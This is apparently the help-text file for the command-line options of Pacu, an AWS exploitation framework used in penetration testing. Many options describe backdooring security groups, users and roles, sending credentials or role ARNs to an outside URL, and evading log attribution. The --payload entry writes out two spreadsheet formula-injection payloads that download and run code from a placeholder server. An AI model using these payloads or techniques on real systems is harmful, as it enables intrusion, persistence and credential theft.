--account-id.help: AWS account ID to search for associated EBS snapshots.

--account-id-wordlist.help: File path to a wordlist of AWS account IDs to search for associated EBS snapshots.

--accounts.help: Pass in a list of accounts to try assuming, --accounts 1 2 3

--accounts-file.help: Pass in a filename containing a list of accounts to try assuming

--activate-session.help: activate session, use session arg to set session name

--alarms.help: Comma-separated list of CloudWatch alarm names and regions to target, instead of enumerating them. They should be formatted like alarm_name@region.

--all-instances.help: Skip vulnerable operating system check and just target every instance

--arn.help: The ARN of your own IAM user or role that you want to add to the assume role policy document.

--attacker-key.help: Pacu key name to use for the attacker account when deploying the lambda function.

--brute.help: Use default brute force list in Buckets.txt

--bucket.help: The S3 Bucket name to target, this is usually something like cf-templates-*.

--builds.help: Enumerate builds. If this is passed in without --projects, then only builds will be enumerated. By default, both are enumerated.

--ca-list.help: List private certificate authorities created within ACM

--certs-chain.help: Get certs and the certificate chain as well

--certs-expired-list.help: List expired certificates which could potentially be taken over

--checksource.help: Download and scan all lambda functions for secrets. Warning this could effect performance.

--cleanup.help: Searches for Pacu keys previously generated and removes them.

--cluster_name.help: The cluster name from which service account tokens of pods are to be extracted from

--command.help: The shell command to run on the targeted EC2 instances

--config-aggregators.help: Comma-separated list of Config configuration aggregator names and regions to target, instead of enumerating them. They should be formatted like aggregator_name@region.

--config-recorders.help: Comma-separated list of Config configuration recorder names and regions to target, instead of enumerating them. They should be formatted like recorder_name@region.

--config-rules.help: Comma-separated list of Config rule names and regions to target, instead of enumerating them. They should be formatted like rule_name@region.

--delegated-services.help: List Delegated Services in org per account ID. If necessary manualy pass in organization IDs.

--detectors.help: Comma-separated list of GuardDuty detector IDs and regions to target, instead of enumerating them. They should be formatted like detector_id@region.

--domain.help: Base domain to be queried against.

--download-reports.help: Optional argument to download HTML reports for each run

--dump.help: Attempt to download all information stored in the tables to separate files and scan all stored strings for secrets. Warning this could take a long time.

--email.help: Email address to receive verification code (not always needed; this is sometimes sent to username).

--enabled-services.help: List Enabled Service Access in org

--environments.help: Enumerate EB environments for each application.

--exfil-url.help: The URL to POST backdoored roles' ARNs to, so you can assume them.

--flow-logs.help: Comma-separated list of VPC Flow Log IDs and regions to target, instead of enumerating them. They should be formatted like log_id@region.

--from-time.help: Download logs from time format "yyyy[-mm[-dd-[hh-mm-ss]]]". Unfilled fields will assume earliest possible time

--global-region.help: Flag to enumerate WAF information for all regions.

--grep.help: Will recursively list files from buckets (when listable) and grep for keywords FILE. Ex: -g sensitive_keywords.txt

--groups.help: The EC2 security groups to backdoor in the format of a comma separated list of name@region. If omitted, all security groups will be backdoored.

--help.help: show this help message and exit

--identity_pools.help: Identity pool(s) to target. Defaults to all session identity pools.Standard format of 'REGION:GUID' and requires the single quotes due to colon (e.g. 'us-east-1:7dbbvc22-b905-4d75-9b2a-54ade5132076').

--import-key-file.help: Import a key if specified, otherwise, create one.

--import-keys.help: AWS profile name to import keys from

--ip.help: The IP address or CIDR range to allow access to (ex: 127.0.0.1/24). The default is to allow access from any IP address (0.0.0.0/0).

--ip-name.help: The name of an existing instance profile with an "EC2 Role for Simple Systems Manager" attached to it. This will skip the automatic role/instance profile enumeration and the searching for a Systems Manager role/instance profile. Example: "arn:aws:iam::1111111111111:user/example"

--ip-range.help: The IP range to allow backdoor access to. This would most likely be your own IP address in the format: 127.0.0.1/32

--key-name.help: Alias for imported/created key pair. Defaults to Pacu.

--keyword.help: Keyword to search for in EBS snapshot descriptions.

--keyword-wordlist.help: File path to a wordlist of keywords to search for in EBS snapshot descriptions.

--module-info.help: Get information on a specific module, use --module- name

--no-include-shared.help: Do not include snapshots shared to this account by other accounts.

--no-random.help: If this argument is supplied in addition to a list of user ARNs, a trust relationship is created for each user in the list with each role, rather than one of them at random.

--password.help: Password for sign-up or login. Defaults to TesPas808@!.

--path.help: A public link to a file containing a list of IP addresses to whitelist (such as an object in an S3 bucket). This link must stay online/public for as long as you want the IP list whitelisted.

--payload.help:
The formula payload to use. Some examples:
 This formula uses PowerShell to contact an external server to download and execute a binary file: =cmd|' /C powershell Invoke-WebRequest "http://your-server.com/test.exe" -OutFile "$env:Temp\shell.exe"; Start-Process "$env:Temp\shell.exe"'!A1
This formula contacts a remote server to download and execute a .sct file: =MSEXCEL|'\..\..\..\Windows\System32\regsvr32 /s /n /u /i:http://your-server.com/SCTLauncher.sct scrobj.dll'!''

--policies.help: Enumerate info for policies in the account

--port-range.help: The port range to open for each EC2 security group in the format start-end (ex: 1-455). The default range is every port (1-65535).

--projects.help: Enumerate projects. If this is passed in without --builds, then only projects will be enumerated. By default, both are enumerated.

--protocol.help: The protocol for the IP range specified. Options are: TCP, UDP, ICMP, or ALL. The default is TCP. WARNING: When supplying ALL, AWS will automatically allow traffic on all ports, regardless of the range specified. More information is available here: https://boto3.readthedocs.io/en/latest/reference/services/ec2.html#EC2.Client.authorize_security_group_ingress

--quiet.help: Do not print the banner on startup

--regions.help: Regions to enumerate ACM in (defaults to "all" session regions)

--replace.help: For EC2 instances that already have an instance profile attached to them, this argument will replace those with the Systems Manager instance profile. WARNING: This can cause bad things to happen! You never know what negative side effects this may have on a server without further inspection, because you do not know what permissions you are removing/replacing that the instance already had

--role-arn.help: The role should allow Lambda to assume it and have at least the IAM UpdateAssumeRolePolicy and GetRole permissions

--role-names.help: A comma-separated list of role names from the AWS account that trust relationships should be created with. Defaults to all roles.

--roles.help: Enumerate info for roles in the account

--roles-file.help: Pass in a filename containing a list of roles to try assuming

--s3-access-key.help: Pacu key name to use for the deployed lambda function to access S3 in the victim account account.

--s3-notifications-setup-key.help: Pacu key name to use for configuring the victims S3 buckets to send notifications to our lambda function. If this is not specified the s3-access-key credentials will be used for this instead.

--script.help: File path of the shell script to add to the EC2 instances

--security-group.help: Security group Id to host task. Subnet and security group must be in same VPC

--set-keys.help: alias, access id, secret key, token

--source.help: Download the source code of the deployed application and scan it for secrets.

--subbrute.help: Enable sublist3r's subbrute module when querying for subdomains.

--sublist3r.help: Retrieve list of subdomains and use this to query against S3.

--subnet.help: Subnet ID to host task. Subnet and security group must be in same VPC

--target-instances.help: A comma-separated list of instances and regions to set as the attack targets in the format of instance-id@region,instance2-id@region...

--target-os.help: This argument is what operating systems to target. Valid options are: Windows, Linux, or All. The default is All

--targets.help: Comma-separated list of GuardDuty detector IDs and regions to target (ex: sdasdasdasd@us-west2). By default, this module will check the database for enumerated detectors and offer to enumerate them if none are found.

--task-role.help: ARN of task role, defaults to what is provided in the task definition

--threads.help: Max number of threads, default is 6.

--to-time.help: Download logs up to and not including time format "yyyy[-mm[-dd-[hh-mm-ss]]]". Unfilled fields will assume earliest possible time

--trails.help: Comma-separated list of CloudTrail trail names and regions to target instead of enumerating them. They should be formatted like trail_name@region.

--tree.help: Generate visual tree using root, accounts, and OUs

--update.help: Try to update login profiles instead of creating a new one. This can be used to change other users passwords who already have a login profile.

--uri.help: URI to send credentials to via POST

--user-arns.help: A comma-separated list of user ARNs that the trust relationship with roles should be created with. By default, user ARNs in this list are chosen at random for each role to try and prevent the tracking of the logs all back to one user account. Without this argument, the module will default to the current user.

--user_pool_clients.help: User pool client(s) to target. Defaults to all session user pool clients. Format: ClientID@UserPoolID (e.g. 1june8@us-west-2_uS2erhWzQ).

--user_pools.help: User pool(s) to target. This will attempt to list their user pool clients and target them also. Defaults to user pools indicated in user pool clients argument, and to all session user pools if none is found. Standard format of REGION_GUID (e.g. us-west-2_uS2erhWzQ).

--username.help: Username for sign-up or login. Defaults to testuser.

--usernames.help: A comma-separated list of usernames of the users in the AWS account to backdoor. If not supplied, it defaults to every user in the account

--users.help: Enumerate users in each user pool

--versions-all.help: Grab all versions instead of just the latest

--vols.help: If this argument is passed without --snaps, this module will only enumerate volumes. If neither are passed, both volumes and snapshots will be enumerated.

--whoami.help: Display information on current IAM user

--word-list.help: File path to a different word list to use. There is a default word list with 1100+ words. The word list should contain words, one on each line, to use to try and guess IAM role names. Role names ARE case-sensitive.

--zone.help: Availability zone of instance to target

access_key_id.help: The access key ID to decode. If not provided, the current access key ID for the current profile will be used.
